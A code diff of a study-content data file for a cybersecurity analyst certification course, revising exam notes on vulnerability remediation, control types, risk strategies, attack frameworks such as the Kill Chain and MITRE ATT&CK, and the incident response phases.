-          "Secure Coding Best Practices: Secure coding best practices involve developing software in a way that prevents common vulnerabilities and strengthens application security.",
-          "Patching and Configuration Management: Patching and configuration management involve applying updates and maintaining secure settings to protect systems from known vulnerabilities.",
-          "Exceptions: An exception is a formally approved decision to temporarily accept a security risk when remediation cannot be performed immediately.",
-          "Compensating Controls: Compensating controls are alternative security measures used to reduce risk when the primary security control cannot be implemented.",
-          "Examples of Compensating Controls: Firewall restrictions, multi-factor authentication (MFA), network segmentation, additional monitoring, and access control restrictions.",
+          "Attack surface management: Continually finding and reducing exposed assets, ports, services, and accounts.",
+          "Secure coding best practices: Input validation, parameterized queries, and secure design to prevent flaws in new code.",
+          "Patching and configuration management: Applying updates and maintaining approved secure settings.",
+          "Exceptions: A formally approved, documented, time-limited decision to accept a risk when remediation cannot be done now.",
+          "Compensating controls: Alternative controls that reduce the risk when the main fix is impossible, such as network segmentation, firewall rules, MFA, extra monitoring, or access restrictions.",
         ],
         remember:
-          "Think of protecting a village. Attack surface management = closing unused gates. Secure coding = building walls that are strong from the start. Patching = repairing the cracks you know about. Exception = the mayor signing off that one crack stays for now. Compensating control = posting extra guards at the crack until it can be repaired.",
+          "Protecting a village. Attack surface management = closing unused gates. Secure coding = building strong walls from the start. Patching = repairing known cracks. Exception = the mayor signing off that one crack stays for now. Compensating control = extra guards posted at the crack until it is repaired.",
         examTip:
-          "Legacy system cannot be patched or the patch would break production = request a documented exception and add compensating controls (segmentation, firewall rules, MFA, extra monitoring). An exception is only valid if approved, documented, and time-limited. Reducing exposed services, ports, and unused assets = attack surface management. Preventing injection flaws in new code = secure coding.",
+          "Legacy system cannot be patched or a patch would break production = request a documented exception AND add compensating controls (segmentation, firewall rules, MFA, monitoring). An exception is valid only if it is approved, documented, and time-limited. Reducing exposed services and unused assets = attack surface management. Preventing injection in new code = secure coding.",
       },
       {
         heading: "Validation of Remediation",
         explain:
-          "A fix is not finished until someone proves it worked. Validation closes the loop and catches problems that come back.",
+          "A fix is not finished until someone proves it worked.",
         points: [
-          "Validation of Remediation: Validation of remediation is the process of confirming that a vulnerability has been successfully fixed.",
-          "Rescanning: Rescanning involves performing another vulnerability scan after remediation to verify that the issue no longer exists.",
-          "Verification Testing: Verification testing confirms that the implemented fix effectively eliminates the vulnerability.",
-          "Security Monitoring: Security monitoring ensures that remediated vulnerabilities do not reappear and that systems remain secure over time.",
+          "Rescanning: Scan again after remediation to confirm the finding is gone.",
+          "Verification testing: Test that the fix actually removes the weakness (for example, retry the exploit or check the configuration).",
+          "Security monitoring: Keep watching so fixed issues do not return or get exploited meanwhile.",
         ],
         remember:
-          "Think of fixing a leaking pipe. Rescanning = turning the water back on and looking for drips. Verification testing = pressure-testing the repair. Security monitoring = checking again next week in case it leaks again. You do not say the pipe is fixed until you have tested it.",
+          "Fixing a leaking pipe. Rescanning = turning the water back on and looking for drips. Verification = pressure-testing the repair. Monitoring = checking again next week in case it leaks again. You do not say the pipe is fixed until you have tested it.",
         examTip:
-          "Patch was applied and the ticket is about to be closed = the next step is rescan to confirm. Patch applied but the scanner still shows the flaw = investigate (failed install, reboot needed, or false positive). Vulnerabilities returning after being fixed = add security monitoring and review configuration management.",
+          "Patch applied and ticket about to be closed = the next step is to rescan to confirm. Patch applied but the scanner still shows the flaw = investigate (failed install, reboot needed, wrong scan, or a false positive). Vulnerabilities that keep returning = review configuration management and add monitoring.",
       },
     ],
   },
-
   {
     id: "domain-2-4",
-    title: "Vulnerability Response, Handling, and Management",
+    title: "Control Types, Risk, and Vulnerability Management Concepts",
     domain: "Domain 2.0",
     domainName: "Vulnerability Management",
     module: "2.4",
-    moduleName: "Vulnerability Mitigation",
+    moduleName: "Controls, Risk, and Governance",
     description:
       "Control types and functions, risk concepts, risk management strategies, policies and governance, SLOs, application security testing, and third-party risk.",
-    lastUpdated: "Oct 13, 2026",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: ShieldCheck,
-    estimatedTime: "2 hours",
+    estimatedTime: "100 minutes",
     sections: [
       {
         heading: "Control Types",
         explain:
-          "Security controls are grouped by how they are delivered. Some are rules for people, some are built into technology, and some protect the physical world.",
+          "Controls are grouped by how they are delivered: rules for people, technology, or the physical world.",
         points: [
-          "Administrative Controls: Administrative controls are policies, procedures, standards, and training programs that guide how people manage and protect organizational resources.",
-          "Technical Controls: Technical controls are security measures implemented through hardware or software to protect systems and data. Examples: firewalls, antivirus software, encryption, IDS/IPS, and multi-factor authentication (MFA).",
-          "Physical Controls: Physical controls are measures that protect facilities, equipment, and personnel from unauthorized physical access. Examples: security guards, locks, fences, security cameras, and biometric scanners.",
+          "Administrative controls: Policies, procedures, standards, and training that guide how people behave.",
+          "Technical controls: Hardware or software protections such as firewalls, antivirus, encryption, IDS/IPS, and MFA.",
+          "Physical controls: Measures that protect facilities and equipment, such as locks, fences, guards, cameras, and biometric door readers.",
         ],
         remember:
-          "Think of a school. Administrative = the rulebook and the safety training for staff. Technical = the electronic gate and the cameras' software. Physical = the fence, the locked doors, and the guard at the entrance. Rules for people, tools in technology, barriers in the real world.",
+          "A school. Administrative = the rulebook and safety training for staff. Technical = the electronic gate and the software on the cameras. Physical = the fence, the locked doors, and the guard at the entrance. Rules for people, tools in technology, barriers in the real world.",
         examTip:
-          "Policy, procedure, standard, or training = administrative. Firewall, encryption, MFA, or IDS = technical. Lock, fence, guard, camera, or biometric scanner = physical. Questions give you an example and ask you to name the type, so match the example first.",
+          "Policy, procedure, standard, or training = administrative. Firewall, encryption, MFA, or IDS = technical. Lock, fence, guard, camera, or badge reader = physical. Questions give an example and ask for the type, so match the example first.",
       },
       {
         heading: "Control Functions",
         explain:
-          "Controls are also grouped by what they do in the life of an incident: stop it, spot it, react to it, or fix the damage.",
+          "Controls are also grouped by what they do around an incident: stop it, spot it, react to it, or repair the damage.",
         points: [
-          "Preventative Controls: Preventative controls are designed to stop security incidents from occurring before they happen. Examples: firewalls, MFA, access controls, and security awareness training.",
-          "Detective Controls: Detective controls identify and alert organizations when suspicious or unauthorized activities occur. Examples: SIEM systems, IDS, log monitoring, and security audits.",
-          "Responsive Controls: Responsive controls take action during or immediately after a security event to limit damage and contain threats. Examples: incident response procedures, account lockouts, and automated containment actions.",
-          "Corrective Controls: Corrective controls restore systems and operations after a security incident and prevent the issue from reoccurring. Examples: patching, backups, system restoration, and disaster recovery plans.",
+          "Preventative: Stops an incident before it happens. Examples: firewall rules, MFA, access control, security training, routine patching.",
+          "Detective: Finds and alerts on suspicious activity. Examples: SIEM, IDS, log monitoring, audits, cameras.",
+          "Responsive: Acts during or right after an event to contain it. Examples: isolating a host, blocking an IP through SOAR, disabling a compromised account, running the incident response plan.",
+          "Corrective: Restores systems and fixes the cause after an incident. Examples: restoring from backup, patching the exploited flaw, rebuilding a system, disaster recovery.",
         ],
         remember:
-          "Think of a house fire. Preventative = the fireproof wiring and the rule not to leave the stove on. Detective = the smoke alarm. Responsive = the sprinklers and the fire brigade putting it out. Corrective = rebuilding the kitchen and fixing the faulty wire. Before, during detection, during response, and after.",
+          "A house fire. Preventative = fireproof wiring and not leaving the stove on. Detective = the smoke alarm. Responsive = the sprinklers and the fire brigade putting it out. Corrective = rebuilding the kitchen and fixing the faulty wire.",
         examTip:
-          "Stops it before it happens = preventative. Alerts or logs after something suspicious happens = detective. Contains or limits damage as it happens = responsive. Restores systems or fixes the root cause afterwards = corrective. The same tool can fit more than one function, so read what the scenario says the control is doing. Note that CompTIA often lists the function names as preventive, detective, corrective, and responsive.",
+          "Stops it before it happens = preventative. Alerts or logs after something suspicious happens = detective. Contains or limits damage as it happens = responsive. Restores or fixes the root cause afterward = corrective. Patching in advance is preventative, but patching the exploited hole after a breach is corrective. Read what the control is DOING in the scenario.",
       },
       {
         heading: "Risk Concepts",
         explain:
-          "Risk never reaches zero. Analysts describe how much risk exists before controls, how much is left after, and how much the business is willing to live with.",
+          "Risk never reaches zero. These terms describe the risk before controls, after controls, and how much leadership will tolerate.",
         points: [
-          "Risk Appetite: Risk appetite is the amount of risk an organization is willing to accept in pursuit of its objectives.",
-          "Residual Risk: Residual risk is the level of risk that remains after security controls and mitigation measures have been implemented.",
-          "Inherent Risk: Inherent risk is the level of risk that exists before any security controls or safeguards are applied.",
-          "Memory Tip: Inherent Risk → Controls Applied → Residual Risk.",
+          "Inherent risk: The risk that exists before any controls are applied.",
+          "Residual risk: The risk that remains after controls are applied.",
+          "Risk appetite: The amount of risk the organization is willing to accept to pursue its goals.",
+          "Flow: Inherent risk, then controls applied, then residual risk, which is compared with risk appetite.",
         ],
         remember:
-          "Think of driving. Inherent risk = the danger of driving with no seatbelt, no airbags, and no rules. Controls = seatbelt, airbags, and speed limits. Residual risk = the danger that is still there after all of that. Risk appetite = how much danger you are willing to accept to get to work on time.",
+          "Driving. Inherent risk = the danger of driving with no seatbelt, no airbags, and no rules. Controls = seatbelt, airbags, and speed limits. Residual risk = the danger that is still there. Risk appetite = how much danger you will accept to get to work on time.",
         examTip:
-          "Risk before any controls = inherent. Risk left after controls = residual. If residual risk is higher than the risk appetite, add more controls or choose another strategy. Residual risk is never zero. A question about how much risk leadership will tolerate = risk appetite.",
+          "Risk before any controls = inherent. Risk left after controls = residual. If residual risk is higher than the risk appetite, add controls or pick another strategy. Residual risk is never zero. 'How much risk leadership will tolerate' = risk appetite.",
       },
       {
         heading: "Risk Management Strategies",
         explain:
-          "When a risk is identified, an organization has four basic choices: live with it, pass it on, remove it, or reduce it.",
+          "When a risk is identified, an organization has four basic choices.",
         points: [
-          "Accept: Accepting risk means acknowledging a risk and deciding not to take additional action because the impact is considered acceptable.",
-          "Transfer: Transferring risk involves shifting the financial or operational impact of a risk to another party. Example: purchasing cyber insurance.",
-          "Avoid: Avoiding risk means eliminating activities or conditions that create the risk. Example: disabling an insecure service.",
-          "Mitigate: Mitigating risk involves implementing security controls that reduce the likelihood or impact of a threat. Example: applying security patches and enabling MFA.",
+          "Accept: Knowingly live with the risk because the impact or likelihood is low or the cost of control is too high. It should be documented and approved.",
+          "Transfer: Shift the financial impact to another party, for example by buying cyber insurance or outsourcing.",
+          "Avoid: Stop the activity that creates the risk, for example by shutting down an insecure service.",
+          "Mitigate: Reduce likelihood or impact with controls such as patching, MFA, or segmentation.",
         ],
         remember:
-          "Think of a rainy day. Accept = go out and get wet because it is only a drizzle. Transfer = take a taxi so the weather becomes the driver's problem (insurance). Avoid = stay home. Mitigate = take an umbrella and wear a raincoat. Four answers to the same storm.",
+          "A rainy day. Accept = go out and get wet because it is only a drizzle. Transfer = take a taxi so the weather becomes the driver's problem (insurance). Avoid = stay home. Mitigate = take an umbrella and wear a raincoat.",
         examTip:
-          "Buying cyber insurance or outsourcing = transfer. Shutting down a risky service or dropping the activity = avoid. Patching, MFA, or segmentation = mitigate. Documenting that leadership knowingly lives with it = accept. Cyber insurance moves the cost but does not remove the risk itself.",
+          "Insurance or outsourcing = transfer. Shutting down a risky service or dropping the activity = avoid. Patching, MFA, or segmentation = mitigate. Leadership signs off to live with it = accept. Insurance moves the cost but does not remove the risk itself.",
       },
       {
-        heading: "Policies, Governance, and Service-Level Objectives (SLOs)",
+        heading: "Policies, Governance, SLOs, and SLAs",
         explain:
-          "Written rules, oversight, and measurable targets keep security work consistent and make sure it supports the business.",
+          "Written rules, oversight, and measurable targets keep security work consistent and aligned with the business.",
         points: [
-          "Policies: Policies are formal documents that define security requirements, expectations, and acceptable behavior within an organization.",
-          "Governance: Governance is the framework used to direct, manage, and monitor an organization's security activities to ensure compliance and alignment with business goals.",
-          "Service-Level Objectives (SLOs): Service-Level Objectives (SLOs) are measurable targets that define the expected performance, availability, or reliability of a service. Example: maintaining 99.9% system uptime.",
+          "Policies: Formal documents stating requirements and expected behavior.",
+          "Governance: The framework for directing, overseeing, and checking security activities so they meet business goals and compliance requirements.",
+          "Service-level objective (SLO): A measurable internal target, such as patch critical flaws within 7 days or 99.9 percent uptime.",
+          "Service-level agreement (SLA): An agreement, often with a customer or vendor, that sets the expected service and often the consequences if it is missed. SLOs are the targets that support an SLA.",
         ],
         remember:
-          "Think of a football league. Policies = the rulebook. Governance = the league officials who make sure every team follows the rules and the league's goals are met. SLO = the scoreboard target, like winning 9 of 10 matches. Rules, oversight, and measurable goals.",
+          "A football league. Policy = the rulebook. Governance = the officials who make sure every team follows the rules. SLO = the target on the coach's whiteboard (win 9 of 10). SLA = the signed contract that says what happens if you do not.",
         examTip:
-          "Formal document stating what is and is not allowed = policy. Framework for oversight, compliance, and alignment with business goals = governance. A number you can measure, like 99.9% uptime or patch critical flaws within 7 days = SLO. A measurable remediation deadline is a classic SLO example.",
+          "Formal document of what is and is not allowed = policy. Oversight, compliance, and alignment with business goals = governance. A number you can measure internally = SLO. An agreement with consequences, often with a vendor or customer = SLA. A remediation deadline by severity is a classic SLO example.",
       },
       {
         heading: "Application Security",
         explain:
           "Application security testing finds weaknesses in software, either by reading the code or by attacking the running program.",
         points: [
-          "Static Application Security Testing (SAST): SAST analyzes application source code, bytecode, or binaries for security vulnerabilities without running the application.",
-          "Dynamic Application Security Testing (DAST): DAST analyzes a running application by testing it from the outside to identify security vulnerabilities during operation.",
-          "Software Assurance Maturity Model (SAMM): SAMM is a framework that helps organizations evaluate, measure, and improve the security maturity of their software development processes.",
-          "Memory Tip: SAST = scan code before execution. DAST = test application while running.",
+          "Static Application Security Testing (SAST): Analyzes source code, bytecode, or binaries without running the program. It finds issues early and can point to the line of code, but can give false positives.",
+          "Dynamic Application Security Testing (DAST): Tests a running application from the outside, with no source code, like an attacker would. It finds runtime issues but cannot point to the exact line.",
+          "Software Assurance Maturity Model (SAMM): A framework from OWASP for measuring and improving how mature an organization's software security practices are.",
         ],
         remember:
-          "Think of checking a car. SAST = reading the blueprints and engine design before the car is built, looking for mistakes. DAST = taking the finished car on a test drive and trying to make it fail. SAMM = the grading chart that shows how mature your whole car factory is at building safe cars.",
+          "Checking a car. SAST = reading the blueprints and engine design before the car is built, looking for mistakes. DAST = taking the finished car on a test drive and trying to make it fail. SAMM = the grading chart that shows how mature the whole car factory is at building safe cars.",
         examTip:
-          "Has source code and the app is not running = SAST (finds problems early, in development). Testing a live app from the outside, with no source code = DAST. Measuring how mature the development security program is, or planning improvements = SAMM. SAST can have false positives, and DAST cannot point to the exact line of code.",
+          "Has source code and the app is not running = SAST (shift left, early in the SDLC). Testing a live app from outside with no code = DAST. Measuring how mature the development security program is = SAMM. Use both SAST and DAST because they find different problems.",
       },
       {
         heading: "Third-Party Risk",
         explain:
-          "Software and hardware rarely come from one place. Weaknesses in vendors and components can enter your environment even when your own work is secure.",
+          "Your software and hardware come from many sources. Weaknesses in suppliers and components enter your environment even when your own work is secure.",
         points: [
-          "Supply Chain: Supply chain risk refers to security threats introduced through vendors, suppliers, service providers, hardware, software, or other external dependencies.",
-          "Software Composition Analysis (SCA): Software Composition Analysis is the process of identifying and evaluating third-party and open-source software components used within applications for vulnerabilities and licensing issues.",
-          "Software Bill of Materials (SBOM): A Software Bill of Materials is a detailed inventory of all software components, libraries, dependencies, and versions used to build an application.",
-          "Memory Tip: SCA = finds vulnerable components. SBOM = lists all components.",
+          "Supply chain risk: Threats introduced through vendors, suppliers, service providers, software updates, or hardware.",
+          "Software Composition Analysis (SCA): Identifies third-party and open-source components in an application and checks them for known vulnerabilities and license issues.",
+          "Software Bill of Materials (SBOM): A detailed inventory of all components, libraries, and versions in an application.",
         ],
         remember:
-          "Think of a packaged meal. The SBOM = the ingredients label that lists everything inside. SCA = the lab test that checks each ingredient for contamination. Supply chain risk = the farm that grew a bad ingredient. You did not grow it, but it is still in your meal.",
+          "A packaged meal. The SBOM is the ingredients label that lists everything inside. SCA is the lab test that checks each ingredient for contamination. Supply chain risk is the farm that grew a bad ingredient: you did not grow it, but it is still in your meal.",
         examTip:
-          "A list of every library and version in an application = SBOM. Scanning those components for known vulnerabilities and license problems = SCA. A new flaw like Log4j appears and you must find which apps use it = check the SBOM. Compromised vendor update or tampered component = supply chain attack.",
+          "A list of every library and version in an application = SBOM. Scanning those components for known flaws and license problems = SCA. A new flaw like Log4j appears and you must find which apps use it = check the SBOM. A compromised vendor update or tampered component = supply chain attack.",
       },
     ],
   },
-
-  // Domain 3.0: Incident Response and Management (24%)
+  // ===================== DOMAIN 3.0 INCIDENT RESPONSE AND MANAGEMENT (24%) =====================
   {
     id: "domain-3-1",
     title: "Attack Methodologies and Frameworks",
     domain: "Domain 3.0",
     domainName: "Incident Response and Management",
     module: "3.1",
-    moduleName: "Attack Methodologies and Frameworks",
+    moduleName: "Attack Methodology Frameworks",
     description:
-      "MITRE ATT&CK framework, cyber kill chain, attack patterns, threat actor TTPs, and attack lifecycle.",
-    lastUpdated: "Oct 9, 2026",
+      "The Cyber Kill Chain, the Diamond Model of Intrusion Analysis, and the MITRE ATT&CK framework, and when to use each.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: Brain,
-    estimatedTime: "2 hours",
+    estimatedTime: "75 minutes",
     sections: [
       {
-        heading: "Cyber kill chain",
+        heading: "Cyber Kill Chain",
         explain:
-          "Scanning and mapping the network to understand its structure, devices, and potential vulnerabilities.",
+          "The Lockheed Martin Cyber Kill Chain breaks an attack into 7 linear phases. If defenders break the chain at any phase, the attack fails.",
         points: [
-          "Reconnaissance: The attacker gathers information about the target, such as users, systems, email addresses, and network infrastructure.",
-          "Weaponization: The attacker creates or prepares a malicious payload, such as malware or a phishing document, to use against the target.",
-          "Delivery: The attacker delivers the malicious payload to the target through methods such as email, websites, USB devices, or malicious downloads.",
-          "Exploitation: The attacker exploits a vulnerability or weakness to execute malicious code on the target system.",
-          "Installation: The attacker installs malware or other malicious tools on the compromised system to maintain access.",
-          "Command and Control (C2): The compromised system communicates with the attacker's server, allowing the attacker to remotely control the device.",
-          "Actions on Objectives: The attacker performs their final objective, such as stealing data, encrypting files, disrupting services, or conducting espionage."
+          "Reconnaissance: The attacker gathers information about the target, such as employees, email addresses, and exposed systems.",
+          "Weaponization: The attacker builds or prepares the malicious payload, such as a malware-laden document.",
+          "Delivery: The payload is sent to the target through email, a website, USB, or another channel.",
+          "Exploitation: A vulnerability or user action triggers the attacker's code to run.",
+          "Installation: Malware or a backdoor is installed to keep access.",
+          "Command and Control (C2): The compromised system connects to the attacker's server so it can be controlled remotely.",
+          "Actions on Objectives: The attacker reaches the goal, such as stealing data, encrypting files, or disrupting services.",
         ],
         remember:
-          "The kill chain is a linear, 7-step sequence: Recon, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives. Break the chain at any step and the attack fails.",
+          "Order: Recon, Weaponize, Deliver, Exploit, Install, C2, Actions. A burglary: case the house, build the tools, get the tools to the door, break in, hide a key under the mat, phone the boss, take the goods. Stop the burglar at any step and the burglary fails.",
         examTip:
-          'Memorize the order and match scenarios to phases. A phishing email being sent is Delivery. Code running after a user opens the attachment is Exploitation. A backdoor being planted is Installation. Beaconing to an external server is C2. Also remember that the kill chain is linear, while ATT&CK is not.',
+          "Match the scenario to the phase. Phishing email sent = Delivery. Code runs after the user opens the attachment = Exploitation. A backdoor or scheduled task is planted = Installation. Regular beaconing to an external server = C2. Data copied out = Actions on Objectives. The kill chain is linear and focused on the perimeter, while ATT&CK is not a strict sequence.",
       },
       {
-        heading: "Diamond Model Analysis",
+        heading: "Diamond Model of Intrusion Analysis",
         explain:
-          "Analytical model to understand and describe cyber attacks through four core features: adversary, capability, infrastructure, and victim.",
+          "The Diamond Model describes every intrusion event with four connected features. Analysts pivot between them to learn more about an attack.",
         points: [
-          'Tactics: The "why" or goal. Examples: Initial Access, Persistence, Privilege Escalation, Defense Evasion, Discovery, Lateral Movement, Execution, Collection, Exfiltration, Impact.',
-          'Techniques: The "how" or method. Example: Phishing (tactic: Initial Access), PowerShell (tactic: Execution).',
-          "Procedures: Real-world implementations by specific threat actors. Example: APT28 uses spear-phishing.",
-          "Mitigations: How to defend. Example: User training for phishing defense.",
-          "Detection: How to detect the technique. Example: Monitor for PowerShell child processes.",
+          "Adversary: The person, group, or organization behind the attack.",
+          "Capability: The tools, malware, and exploits the adversary uses.",
+          "Infrastructure: The resources used to reach the victim, such as IP addresses, domains, and C2 servers.",
+          "Victim: The target: a person, organization, system, or data.",
+          "Pivoting: Moving from one feature to another to find more. For example, a known C2 domain (infrastructure) can lead to the adversary and to other victims.",
+          "Meta-features: Extra context for each event, such as timestamp, phase, result, direction, methodology, and resources.",
         ],
         remember:
-          "Every intrusion event has four corners: Adversary, Capability, Infrastructure, Victim. Analysts pivot between them. For example, a known C2 domain can lead you to the adversary and to other victims.",
+          "A diamond with four corners: Adversary, Capability, Infrastructure, Victim. It is a detective's pin board. Find the getaway car (infrastructure) and you can trace who drives it (adversary) and which other houses it visited (victims).",
         examTip:
-          "Capability means the tools (malware, exploits). Infrastructure means what the attacker uses to reach the victim (IPs, domains, C2 servers). If a question asks which model relates adversary, victim, and tools to support attribution or pivoting, the answer is the Diamond Model.",
+          "Capability = tools (malware, exploits). Infrastructure = what the attacker uses to reach the victim (IPs, domains, C2). A question about relating adversary, victim, tools, and infrastructure to support attribution or pivoting = Diamond Model. The Diamond Model describes an event; the Kill Chain describes the steps over time.",
       },
       {
-        heading: "MITRE ATT&CK Initial",
+        heading: "MITRE ATT&CK",
         explain:
-          "MITRE ATT&CK is a knowledge base and framework that documents real-world attacker behavior by organizing tactics and techniques used throughout the attack lifecycle.",
+          "ATT&CK is a public knowledge base of real attacker behavior, organized as tactics (goals) and techniques (methods). It is the common language of detection and hunting.",
         points: [
-          "Reconnaissance: The attacker gathers information about the target before launching an attack.",
-          "Resource Development: The attacker acquires or develops resources such as domains, infrastructure, accounts, or malware.",
-          "Initial Access: The attacker gains entry into a target environment.",
-          "Execution: The attacker runs malicious code on a target system.",
-          "Persistence: The attacker maintains long-term access to compromised systems.",
-          "Privilege Escalation: The attacker gains higher levels of access or permissions.",
-          "Defense Evasion: The attacker attempts to avoid detection by security controls.",
-          "Credential Access: The attacker attempts to steal usernames, passwords, or authentication tokens.",
-          "Discovery: The attacker gathers information about systems, users, and network resources.",
-          "Lateral Movement: The attacker moves from one system to another within the environment.",
-          "Collection: The attacker gathers data of interest from compromised systems.",
-          "Command and Control: The attacker communicates with compromised systems remotely.",
-          "Exfiltration: The attacker transfers stolen data out of the environment.",
+          "Reconnaissance: Gathering information about the target before the attack.",
+          "Resource Development: Building or buying infrastructure, accounts, and tools.",
+          "Initial Access: Getting into the environment (for example phishing, exploiting a public app).",
+          "Execution: Running malicious code.",
+          "Persistence: Keeping access across restarts and credential changes.",
+          "Privilege Escalation: Gaining higher permissions.",
+          "Defense Evasion: Avoiding detection (disabling security tools, clearing logs).",
+          "Credential Access: Stealing usernames, passwords, and tokens.",
+          "Discovery: Learning about systems, users, and the network.",
+          "Lateral Movement: Moving from one system to another.",
+          "Collection: Gathering the data of interest.",
+          "Command and Control: Communicating with compromised systems.",
+          "Exfiltration: Stealing data out of the environment.",
+          "Impact: Disrupting, destroying, or manipulating systems and data (for example ransomware encryption or data wiping).",
+          "Sub-techniques: More specific versions of a technique. The ATT&CK Navigator can color techniques to build a heat map of coverage.",
         ],
         remember:
-          "Attackers must get in. Then they must stay in and move around. Detect each stage. Tactics are the why, techniques are the how, and procedures are specific real-world implementations.",
+          "Fourteen tactics: attackers must get in (Recon to Initial Access), run and stay (Execution, Persistence), grow and hide (Privilege Escalation, Defense Evasion), explore and move (Credential Access, Discovery, Lateral Movement), take (Collection, C2, Exfiltration), and cause damage (Impact). Tactic = why, technique = how, procedure = how one group does it.",
         examTip:
-          "Know the difference: tactic is the goal (Persistence), technique is the method (Scheduled Task), procedure is how a specific group does it (APT28 spear-phishing). ATT&CK is not a strict linear sequence. Attackers can skip or repeat tactics. It is used for threat hunting, detection gap analysis, and red or purple team planning.",
+          "Tactic is the goal (Persistence). Technique is the method (Scheduled Task). Procedure is how a specific group does it. ATT&CK is not a strict sequence: attackers can skip or repeat tactics. Use it for threat hunting, detection gap analysis, and red or purple team planning. 'Ransomware encrypts files' maps to Impact; 'dumping passwords from memory' maps to Credential Access.",
+      },
+      {
+        heading: "Choosing the Right Framework",
+        explain:
+          "The exam often asks which framework fits a situation. The three models answer different questions.",
+        points: [
+          "Cyber Kill Chain: Linear, 7 phases. Best for understanding the stages of an attack and where to interrupt it.",
+          "Diamond Model: Four features of an intrusion event. Best for analysis, relationships, pivoting, and attribution.",
+          "MITRE ATT&CK: Detailed, non-linear matrix of tactics and techniques. Best for detection engineering, hunting, and mapping behavior.",
+        ],
+        remember:
+          "Kill Chain = the story from start to finish. Diamond = the relationships between the people and things involved. ATT&CK = the encyclopedia of attacker moves.",
+        examTip:
+          "'Where in the attack lifecycle can we stop this?' = Kill Chain. 'Relate adversary, infrastructure, capability, and victim' = Diamond Model. 'Map observed behavior to known techniques, or find detection gaps' = ATT&CK. If the question says 'linear sequence', think Kill Chain.",
       },
     ],
   },
-
   {
     id: "domain-3-2",
-    title: "Incident Response and Detection Process",
+    title: "Incident Response Process",
     domain: "Domain 3.0",
     domainName: "Incident Response and Management",
     module: "3.2",
     moduleName: "Incident Response Process",
     description:
-      "IR phases: detection, analysis, containment, eradication, recovery, and lessons learned. IR team roles and communication.",
-    lastUpdated: "Oct 9, 2026",
+      "The incident response phases in order: preparation, detection, analysis, containment, eradication, recovery, and post-incident activity.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: Zap,
-    estimatedTime: "5 hours",
+    estimatedTime: "75 minutes",
     sections: [
       {
-        heading: "Incident Response Process",
+        heading: "Phase 1: Preparation",
         explain:
-          "IR phases: preparation, detection, analysis, containment, eradication, recovery, and post-incident activities.",
+          "Everything done before an incident so the team can respond quickly and calmly. It is the most important phase because it decides how well every other phase goes.",
         points: [
-          "Preparation: Establish policies, procedures, tools, training, and resources before incidents occur.",
-          "Detection: Identify potential security incidents through monitoring systems, alerts, logs, security tools, and threat intelligence.",
-          "Analysis: Investigate an incident to determine its cause, scope, severity, affected systems, and potential business impact.",
-          "Containment: Limit the spread and impact of an incident by isolating affected systems, accounts, or network segments.",
-          "Eradication: Remove the root cause of an incident, including malware, vulnerabilities, malicious accounts, or unauthorized access.",
-          "Recovery: Restore systems, applications, and services to normal operation while ensuring they are secure and functioning properly.",
-          "Post-Incident: Review the incident, document lessons learned, perform root cause analysis, and implement improvements to prevent future incidents.",
+          "Policies and plans: A written incident response plan, communication plan, and playbooks.",
+          "People: Defined roles, contact lists, and an escalation path. Training and exercises.",
+          "Tools: Logging, SIEM, EDR, forensic tools, and a clean place to work.",
+          "Access: Pre-approved authority to isolate systems and make decisions.",
         ],
         remember:
-          "Effective incident response requires preparation and structured handling of each phase.",
+          "A fire drill and a fire extinguisher on the wall before any fire. When the alarm rings, nobody has time to write the plan.",
         examTip:
-          "Understand the sequence and purpose of each IR phase. Know key activities and responsibilities.",
+          "Writing the IR plan, building playbooks, training, and buying tools = Preparation. If a team is confused during an incident about who decides what, the failure is in preparation (roles and plans were not defined or practiced).",
+      },
+      {
+        heading: "Phase 2: Detection",
+        explain:
+          "Noticing that something may be wrong, from alerts, users, or intelligence.",
+        points: [
+          "Sources: SIEM alerts, EDR, IDS/IPS, user reports, threat intelligence, and outside notification.",
+          "Result: A suspected event that moves into analysis. Not every event is an incident.",
+          "Quality: Tuned alerts reduce false positives and speed up detection.",
+        ],
+        remember:
+          "The smoke alarm goes off. You know something might be burning, but you do not yet know if it is toast or a house fire.",
+        examTip:
+          "An alert from the SIEM or a user reporting a strange email = Detection. An event is something observable; it becomes an incident when it threatens confidentiality, integrity, or availability or violates policy. Detection hands over to analysis.",
+      },
+      {
+        heading: "Phase 3: Analysis",
+        explain:
+          "Working out what really happened, how serious it is, and what is affected, so the right response can be chosen.",
+        points: [
+          "Validate: Decide whether it is a true positive or a false positive.",
+          "Scope: Which systems, accounts, and data are involved.",
+          "Severity and impact: Business effect, data sensitivity, and urgency.",
+          "Timeline and cause: How and when it started and what the attacker did.",
+        ],
+        remember:
+          "The fire inspector walks in: is it real, how big is it, which rooms are involved, and how did it start? You cannot fight a fire you do not understand.",
+        examTip:
+          "Determining the scope, root cause, affected systems, and severity = Analysis. Confirm it is a true positive before containment. Preserve evidence as you analyze so you do not destroy it.",
+      },
+      {
+        heading: "Phase 4: Containment",
+        explain:
+          "Stop the incident from spreading and causing more harm, without destroying evidence.",
+        points: [
+          "Short-term containment: Quick actions such as isolating a host, disabling an account, blocking an IP, or segmenting a network.",
+          "Long-term containment: Temporary fixes that keep the business running while the cause is removed.",
+          "Evidence: Preserve volatile data (memory) before powering a system off.",
+          "Trade-off: Containment may affect operations, so weigh business impact.",
+        ],
+        remember:
+          "Closing the fire doors to stop the blaze spreading to other rooms. You are not putting the fire out yet and you are not rebuilding, just stopping it from growing.",
+        examTip:
+          "Isolate the infected host or disable the compromised account = Containment. Do not wipe or reimage before evidence is collected. Containment comes BEFORE eradication: stop the spread first, then remove the cause. Isolating by network (EDR isolate) keeps the system powered on and preserves memory.",
+      },
+      {
+        heading: "Phase 5: Eradication",
+        explain:
+          "Remove the root cause and everything the attacker left behind.",
+        points: [
+          "Remove: Malware, backdoors, malicious accounts, and persistence mechanisms.",
+          "Fix: Patch the exploited vulnerability, reset credentials, and close the entry point.",
+          "Rebuild: Reimage systems that cannot be trusted.",
+          "Confirm: Check that nothing of the attacker remains.",
+        ],
+        remember:
+          "After the fire is contained, you remove every smoldering ember and the faulty wire that started it. If one ember stays, the fire comes back.",
+        examTip:
+          "Deleting malware, removing a backdoor account, patching the entry point, or reimaging = Eradication. Eradication without fixing the root cause allows reinfection. Reset all credentials the attacker may have touched.",
+      },
+      {
+        heading: "Phase 6: Recovery",
+        explain:
+          "Return systems to normal operation safely and confirm they are secure.",
+        points: [
